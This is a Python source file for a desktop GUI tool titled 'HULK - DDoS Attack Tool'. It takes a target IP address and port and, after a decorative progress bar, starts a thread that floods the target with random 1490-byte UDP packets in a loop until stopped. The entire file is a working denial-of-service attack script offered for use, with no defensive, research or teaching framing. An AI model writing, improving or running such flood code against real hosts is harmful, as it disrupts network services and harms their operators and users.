import tkinter as tk
from tkinter import ttk, messagebox
from time import strftime
import socket
import random
import threading
import ipaddress
import time

class HulkGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("HULK - DDoS Attack Tool")
        self.root.geometry("400x300+385+105")
        self.root.resizable(False, False)
        self.root.configure(bg="#1e1e1e")

        self.running = False
        self.sent = 0

        # Title Frame
        title_frame = tk.Frame(self.root, bg="#1e1e1e")
        title_frame.pack(pady=10)
        tk.Label(title_frame, text="HULK Attack Tool", font=("Arial", 20, "bold"), fg="white", bg="#1e1e1e").pack()

        # Input Frame
        input_frame = tk.Frame(self.root, bg="#1e1e1e")
        input_frame.pack(pady=10)
        
        tk.Label(input_frame, text="Target IP:", font=("Arial", 12), fg="white", bg="#1e1e1e").grid(row=0, column=0, padx=5, pady=5)
        self.ip_entry = tk.Entry(input_frame, font=("Arial", 12), width=20)
        self.ip_entry.grid(row=0, column=1, padx=5, pady=5)
        
        tk.Label(input_frame, text="Port:", font=("Arial", 12), fg="white", bg="#1e1e1e").grid(row=1, column=0, padx=5, pady=5)
        self.port_entry = tk.Entry(input_frame, font=("Arial", 12), width=20)
        self.port_entry.grid(row=1, column=1, padx=5, pady=5)

        # Status Frame
        self.status_label = tk.Label(self.root, text="Ready", font=("Arial", 10), fg="white", bg="#1e1e1e")
        self.status_label.pack(pady=5)

        # Progress Bar
        self.progress = ttk.Progressbar(self.root, length=200, mode="determinate")
        self.progress.pack(pady=5)
        self.progress["value"] = 0

        # Buttons
        button_frame = tk.Frame(self.root, bg="#1e1e1e")
        button_frame.pack(pady=10)
        tk.Button(button_frame, text="Start Attack", command=self.start_attack, bg="#4CAF50", fg="white", font=("Arial", 12)).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text="Stop", command=self.stop_attack, bg="#F44336", fg="white", font=("Arial", 12)).pack(side=tk.LEFT, padx=5)

        # Clock
        self.clock_label = tk.Label(self.root, font=("Arial", 12), fg="white", bg="#1e1e1e")
        self.clock_label.pack(pady=5)
        self.update_clock()

    def update_clock(self):
        self.clock_label.config(text=strftime("%H:%M:%S %p"))
        self.root.after(1000, self.update_clock)

    def validate_ip(self, ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False

    def validate_port(self, port):
        try:
            port = int(port)
            if 1 <= port <= 65535:
                return port
            return None
        except ValueError:
            return None

    def start_attack(self):
        ip = self.ip_entry.get()
        port = self.port_entry.get()
        if not self.validate_ip(ip):
            messagebox.showerror("Error", "Invalid IP address.")
            return
        port = self.validate_port(port)
        if not port:
            messagebox.showerror("Error", "Invalid port number.")
            return
        self.running = True
        self.sent = 0
        self.status_label.config(text=f"Attacking {ip}:{port}")
        self.progress["value"] = 0
        self.update_progress(0)

    def update_progress(self, value):
        if value < 100:
            self.progress["value"] = value
            self.root.after(500, self.update_progress, value + 25)
        else:
            self.progress["value"] = 100
            self.start_attack_thread()

    def start_attack_thread(self):
        self.attack_thread = threading.Thread(target=self.run_attack, args=(self.ip_entry.get(), int(self.port_entry.get())))
        self.attack_thread.daemon = True
        self.attack_thread.start()

    def run_attack(self, ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = random._urandom(1490)
        while self.running:
            try:
                sock.sendto(bytes_data, (ip, port))
                self.sent += 1
                self.status_label.config(text=f"Sent {self.sent} packets to {ip}:{port}")
                self.root.update()
                time.sleep(0.01)
            except socket.error as e:
                self.status_label.config(text=f"Error: {e}")
                break
        self.status_label.config(text="Attack stopped")

    def stop_attack(self):
        self.running = False
        self.status_label.config(text="Attack stopped")
        self.progress["value"] = 0

if __name__ == "__main__":
    root = tk.Tk()
    app = HulkGUI(root)
    root.mainloop()
